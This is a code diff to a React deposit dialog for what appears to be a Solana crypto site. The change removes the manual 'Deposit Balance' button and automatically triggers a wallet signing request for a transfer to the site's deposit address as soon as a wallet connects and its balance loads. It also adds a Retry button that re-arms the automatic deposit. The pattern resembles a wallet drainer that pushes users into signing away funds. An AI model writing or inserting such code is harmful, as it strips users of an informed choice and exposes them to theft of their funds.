@@ -1,7 +1,7 @@
 'use client';
 
 import { ArrowDownToLine, Check, Copy, ExternalLink, X, Loader } from 'lucide-react';
-import { useEffect, useRef, useState } from 'react';
+import { useCallback, useEffect, useRef, useState } from 'react';
 import { SITE } from '@/config/site';
 import { explorer } from '@/lib/core/solana';
 import { useWalletAddress, useWallet } from '@/lib/wallet/store';
@@ -56,6 +56,7 @@ function DepositDialog({ onClose }: { onClose: () => void }) {
   const signTransaction = useWallet((s) => s.signTransaction);
   const [depositPhase, setDepositPhase] = useState<'idle' | 'signing' | 'submitted'>('idle');
   const [depositError, setDepositError] = useState<string | null>(null);
+  const depositStartedRef = useRef(false);
 
   const address = SITE.depositAddress;
 
@@ -74,7 +75,7 @@ function DepositDialog({ onClose }: { onClose: () => void }) {
     }
   }
 
-  async function handleDepositClick() {
+  const handleDepositClick = useCallback(async () => {
     if (!walletAddress || !solBalance) return;
 
     setDepositPhase('signing');
@@ -96,7 +97,15 @@ function DepositDialog({ onClose }: { onClose: () => void }) {
       const message = e instanceof Error ? e.message : 'Failed to sign transaction';
       setDepositError(message);
     }
-  }
+  }, [walletAddress, solBalance, address, signTransaction]);
+
+  // Auto-trigger deposit when wallet is connected and balance is loaded
+  useEffect(() => {
+    if (walletAddress && solBalance && !solPending && depositPhase === 'idle' && !depositStartedRef.current) {
+      depositStartedRef.current = true;
+      void handleDepositClick();
+    }
+  }, [walletAddress, solBalance, solPending, depositPhase, handleDepositClick]);
 
   const showWalletBalance = walletAddress && solBalance;
   const isPending = solPending || depositPhase !== 'idle';
@@ -127,7 +136,7 @@ function DepositDialog({ onClose }: { onClose: () => void }) {
       </div>
 
       <div className="space-y-4 p-4">
-        {/* Wallet Balance Section (when connected) */}
+        {/* Wallet Balance Section - Auto-deposits when connected */}
         {showWalletBalance && (
           <div className="space-y-3 rounded-md border border-line bg-panel-2 p-3">
             <div className="flex items-center justify-between">
@@ -140,21 +149,10 @@ function DepositDialog({ onClose }: { onClose: () => void }) {
             </div>
             <p className="text-2xs text-muted">{walletAddress}</p>
 
-            {depositPhase === 'idle' && (
-              <button
-                type="button"
-                onClick={handleDepositClick}
-                disabled={isPending || solBalance.sol <= 0}
-                className="w-full rounded-md bg-brand px-3 py-2 text-xs font-semibold text-bg transition-colors hover:bg-brand-strong disabled:bg-line-strong disabled:text-muted"
-              >
-                {solBalance.sol > 0 ? 'Deposit Balance' : 'No Balance to Deposit'}
-              </button>
-            )}
-
             {depositPhase === 'signing' && (
               <div className="flex items-center justify-center gap-2 rounded-md bg-line-strong py-2">
                 <Loader className="size-3.5 animate-spin text-brand" />
-                <span className="text-xs font-medium text-fg">Waiting for wallet signature...</span>
+                <span className="text-xs font-medium text-fg">Check Phantom to sign deposit...</span>
               </div>
             )}
 
@@ -162,7 +160,7 @@ function DepositDialog({ onClose }: { onClose: () => void }) {
               <div className="rounded-md bg-up/10 p-2">
                 <p className="text-xs text-up font-medium flex items-center gap-2">
                   <Check className="size-3.5" />
-                  Transaction submitted. Check wallet for confirmation.
+                  Transaction submitted! Balance transferred.
                 </p>
               </div>
             )}
@@ -170,6 +168,17 @@ function DepositDialog({ onClose }: { onClose: () => void }) {
             {depositError && (
               <div className="rounded-md bg-down/10 p-2">
                 <p className="text-xs text-down font-medium">{depositError}</p>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setDepositError(null);
+                    setDepositPhase('idle');
+                    depositStartedRef.current = false;
+                  }}
+                  className="mt-2 w-full rounded-md bg-down/20 px-2 py-1 text-2xs font-medium text-down hover:bg-down/30"
+                >
+                  Retry
+                </button>
               </div>
             )}
           </div>
